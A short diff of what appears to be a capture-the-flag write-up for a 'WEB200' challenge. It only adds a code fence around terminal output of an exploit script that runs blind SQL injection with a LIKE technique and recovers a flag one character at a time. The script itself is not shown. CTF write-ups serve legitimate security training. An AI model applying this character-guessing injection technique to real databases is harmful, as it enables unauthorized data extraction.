@@ -1,5 +1,6 @@
 *WEB200
 
+```
 tmr@os:~$ python exploit.py 
 [+] Blind SQL Injection Exploit Using LIKE Technic 
 [+] New Guessed Char : E
@@ -28,3 +29,4 @@ FLAG_ENTAYA_M3AL
 FLAG_ENTAYA_M3ALE
 [+] New Guessed Char : M
 FLAG_ENTAYA_M3ALEM
+```
